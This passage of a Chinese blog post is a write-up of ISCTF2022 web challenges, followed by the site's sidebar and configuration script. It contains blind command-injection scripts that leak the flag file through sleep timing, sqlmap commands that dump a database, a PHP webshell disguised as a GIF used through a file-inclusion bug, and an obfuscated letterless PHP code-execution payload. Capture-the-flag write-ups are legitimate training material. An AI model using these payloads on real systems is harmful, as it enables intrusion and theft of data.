return &quot;success&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>源码分析肯定是反弹shell但是没有回显<br>这题贴一下别的师傅的解法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">act=1echo `tac /f*`&gt;1.txt1</span><br></pre></td></tr></table></figure>
+<p>这个1和1看源码就知道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;&quot;</span><br><span class="line"></span><br><span class="line">strs = &quot;&quot;</span><br><span class="line"></span><br><span class="line">dics = &quot;abcdefgh ijklmnopqrstuvwxyz&#123;&#125;[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-&quot;</span><br><span class="line">for num1 in range(0,60):</span><br><span class="line">    for st in dics:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;act&#x27;: &#x27;1a=`cat 1.txt`;if [ &quot;$&#123;&#x27;+&#x27;a:&#123;&#125;:&#x27;.format(num1)+&#x27;1&#125;&quot; == &#x27;+&#x27;&quot;&#123;&#125;&quot; ];then sleep 2;fi1&#x27;.format(st)</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            requests.post(url=url, data=data, timeout=1)</span><br><span class="line">        except:</span><br><span class="line">            print(num1)</span><br><span class="line">            strs=strs+st</span><br><span class="line">            print(strs)</span><br><span class="line">print(strs)</span><br></pre></td></tr></table></figure>
+<p>利用睡眠时间的异常<br>爆出flag<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/shellflag1.png"></p>
+<p><b>2. crazy-onlineshell</b></p>
+<p>这里用了一下官方的脚本,上面那个解法我一直爆不出。官方脚本直接两题通杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str = string.hexdigits + &quot;-&quot; + &quot;&#125;&quot; + &quot;ISCTF&#123;&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(0, 1000):</span><br><span class="line">    for n in str:</span><br><span class="line">        payload = f&quot;if [ `cut -c &#123;i&#125; /app/flag` == \&quot;&#123;n&#125;\&quot; ];then sleep 2;fi&quot;</span><br><span class="line"></span><br><span class="line">        url = &quot;http://120.79.18.34:20879/rce&quot;</span><br><span class="line"></span><br><span class="line">        start = int(time.time())</span><br><span class="line">        res = requests.post(url=url, data=&#123;</span><br><span class="line">        &#x27;act&#x27;: &#x27;|&#x27; + payload + &#x27;|&#x27;</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">        end = int(time.time())</span><br><span class="line">        padding = end - start</span><br><span class="line"></span><br><span class="line">        if res.status_code == 200 and padding &gt; 1:</span><br><span class="line">            result = result + n</span><br><span class="line"></span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>官方的计算了从开始到结束的时间,用来判断是否是正确的字符.<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/crazyshellflag.png"></p>
+<h5 id="傻柱"><a href="#傻柱" class="headerlink" title="傻柱"></a>傻柱</h5><p>sql注入.使用burp直接扫出sql注入漏洞<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022sqlua.png"></p>
+<p>直接sqlmap一把梭</p>
+<p>扫数据库<br><code> sqlmap -u http://120.79.18.34:20729/login.php -level 3 --dbs</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022sql1.png"></p>
+<p>扫表<br><code>sqlmap -u http://120.79.18.34:20729/login.php --level 3 -D ctf --tables</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022sqlua2.png"></p>
+<p>扫字段<br><code>sqlmap -u http://120.79.18.34:20729/login.php --level 3 -D ctf -T user_agents --columns --dump</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022sqlua3.png"></p>
+<p>我们敬爱的flag直接就出来了.</p>
+<h5 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h5><p>先扫目录,扫到了<code>www.rar</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">if (preg_match(&quot;/flag|\.\.|\/\//i&quot;, $file)) &#123;</span><br><span class="line">echo &quot;no hack&quot;;</span><br><span class="line"> exit();</span><br><span class="line">&#125; </span><br><span class="line">include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    include(&quot;upload.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>有include漏洞读取文件<br>burp试了一下,可以传.jpg,那就把php代码写到照片的文件里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?= system(&#x27;cat /f*&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022upload1.png"></p>
+<p>payload &#x3D;<code>/index.php?file=uplO4d/1.jpg</code><br>拿到flag<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022uploadflag.png"></p>
+<h5 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h5><p>无字母数字rce<br>利用取反或者异或构建字符 <code>system($_POST[&#39;_&#39;])</code><br>字母的大写绕<br>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=(~&#x27;%8C%86%8C%8B%9A%92&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).</span><br><span class="line">(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).</span><br><span class="line">(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[&#x27;_&#x27;]);</span><br></pre></td></tr></table></figure>
+<p>post传参<code>_=cat /f*</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image@main/image/dongman/IS2022rceflag.png"></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/-f128e7dd768b5.jpg" alt="懒羊羊">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>懒羊羊
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2022/11/03/ISCTF2022/" target="_blank">ISCTF2022</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tags/CTF%E6%AF%94%E8%B5%9B/">CTF比赛</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2022/11/05/python%E5%A4%9A%E7%BA%BF%E7%A8%8B/" class="prev-prefix">« </a> 上一篇：    <a href="/2022/11/05/python%E5%A4%9A%E7%BA%BF%E7%A8%8B/" title="发布于 2022-11-05 02:01">多线程和多进程</a>
+                        <br>
+                    
+                    
+                        <a href="/2022/10/21/%E5%8F%8D%E5%BC%B9shell/" class="next-prefix">» </a> 下一篇：    <a href="/2022/10/21/%E5%8F%8D%E5%BC%B9shell/" title="发布于 2022-10-21 10:01">反弹shell</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/-f128e7dd768b5.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span>懒羊羊</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/first19326" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript" src="/js/Meting.min.js"></script>
+        <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Daylovef",
+        GitHubRepositories : "Hexo-LiveForCode",
+
+        User             : "懒羊羊",
+        UserAvatar       : "/image/sidebar/-f128e7dd768b5.jpg",
+        WebsiteStartDate : "2020-01-01",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) FYL is my girlfriend",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/51c6d5c3154ea2f0.jpg",
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/home.jpeg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/first19326",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
